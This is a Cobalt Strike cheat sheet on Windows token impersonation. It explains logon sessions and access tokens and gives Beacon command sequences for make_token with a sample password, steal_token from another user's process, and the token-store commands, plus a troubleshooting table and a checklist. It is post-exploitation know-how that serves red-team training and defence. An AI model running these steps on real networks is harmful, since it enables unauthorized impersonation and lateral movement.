---
title: "Token Impersonation with Cobalt Strike"
description: "Create a network logon context with known credentials, impersonate a process token and manage stored tokens, with Windows session concepts and command checklists."
category: "User Impersonation"
tools: ["Cobalt Strike"]
updated: "2026-11-10"
tags: ["impersonation", "tokens", "windows", "lateral-movement"]
draft: false
---

## 1. Logon sessions and access tokens

A Windows logon session records an authentication context, including a locally unique identifier (LUID), username, SID, authentication package, logon time and logon server. LSA uses the authentication result to create an access token.

The token includes a token ID, its parent session's Authentication ID, token type, user and group SIDs, privileges and integrity level. Windows compares the applicable token against an object's permissions when deciding access. A process normally has a primary token; a thread can use an impersonation token.

For network authentication, Windows associates the effective token with its logon session and available credentials. Local identity, network credentials and permission on a remote resource are separate checks.

| Method | Input | Effect |
|---|---|---|
| `make_token` | Username and password | Alternate credentials for network authentication |
| `steal_token` | Accessible process token | Impersonation in the current Beacon |
| `token-store steal` / `use` | Process PID, then stored token ID | Retain and select token references |
| `rev2self` | None | Stop impersonating and return to Beacon's original context |

## 2. Known credentials: make_token

`make_token` creates a network-only logon context. It can be used without a high-integrity session in a suitable user context. Local operations retain the original local identity, while network operations can use the supplied credentials. Success when creating the context does not validate the password against the remote service.

```shell
# Run in Beacon with the known password from the exercise
make_token CONTOSO\rsteel Passw0rd!
# Example: Impersonated CONTOSO\rsteel (netonly)

# Test the intended remote resource
ls \\lon-ws-1\c$
# A successful listing confirms access to this share, not unrestricted access

# Return to the original context when finished
rev2self
```

A changed user label in the UI is not proof of authentication. A local `whoami` result can also remain unchanged for a network-only context.

## 3. Existing process: steal_token

The example requires a high-integrity session with access to another user's process token. Elevation alone does not guarantee access to every process. Select the actual PID from the current process list.

At the API level, the flow opens the process, opens its token, duplicates a usable impersonation token and applies it to the thread.

```shell
# Identify an accessible process owned by the intended user
ps
# Example: PID 5248, cmd.exe, x64, CONTOSO\rsteel

# Impersonate its token in the current Beacon
steal_token 5248
# Example: Impersonated CONTOSO\rsteel

# Check context and the resource you actually need
getuid
ls \\lon-ws-1\c$

# End impersonation
rev2self
```

This reuses a token; it does not recover the user's password. A token can represent a local identity without providing usable credentials for every remote service.

## 4. Retaining tokens with token-store

The token store retains token references so they can be selected later, including after the source process exits. This does not keep credentials or remote access valid indefinitely. Store IDs are distinct from process PIDs.

```shell
# Capture a token from the selected process
token-store steal 5248
# Example stored row: ID 0 | PID 5248 | CONTOSO\rsteel

# List available token references
token-store show

# Select the actual store ID shown above
token-store use 0
getuid

# Stop impersonating before removing the stored reference
rev2self
token-store remove 0
token-store show
```

`token-store remove <ID>` removes the stored reference. It is separate from `rev2self`, which ends current impersonation. Use `remove` to delete a stored token reference.

Reference: [Cobalt Strike token store](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_trust-relationships.htm).

## 5. Troubleshooting

| Symptom | What to check |
|---|---|
| `make_token` succeeds but remote access fails | Actual credentials, target permissions and authentication policy |
| Local identity remains unchanged | Expected behavior for a network-only context |
| `steal_token` is denied | Process permissions, integrity and token accessibility |
| A stored token cannot be selected | Actual store ID from `token-store show` |
| Remote access fails with a stolen token | Credentials available to its logon session and remote authorization |

## 6. Quick checklist

Replace placeholders with current values. Choose the credential-based or process-based path rather than running both automatically.

```text
BASELINE
[ ] getuid → record the original Beacon identity
[ ] shell whoami /priv → inspect privileges without assuming access is guaranteed

KNOWN PASSWORD
[ ] make_token <DOMAIN>\<USER> <PASSWORD>
[ ] ls \\<HOST>\<SHARE> → verify actual remote access
[ ] rev2self → return to the original context

PROCESS TOKEN
[ ] ps → identify the intended user and current PID
[ ] steal_token <PID>
[ ] getuid → inspect the selected identity
[ ] ls \\<HOST>\<SHARE> → verify the required remote access separately
[ ] rev2self

TOKEN STORE ALTERNATIVE
[ ] token-store steal <PID>
[ ] token-store show → record the store ID, not the PID
[ ] token-store use <ID>
[ ] getuid
[ ] rev2self
[ ] token-store remove <ID>
[ ] token-store show → verify removal
```

## Related references

- [Pass the Hash](/cheatsheets/pass-the-hash-cobalt-cheatsheet/)
- [Pass the Ticket](/cheatsheets/pass-the-ticket-cobalt-cheatsheet/)
- [Process injection](/cheatsheets/process-injection-cobalt-cheatsheet/)
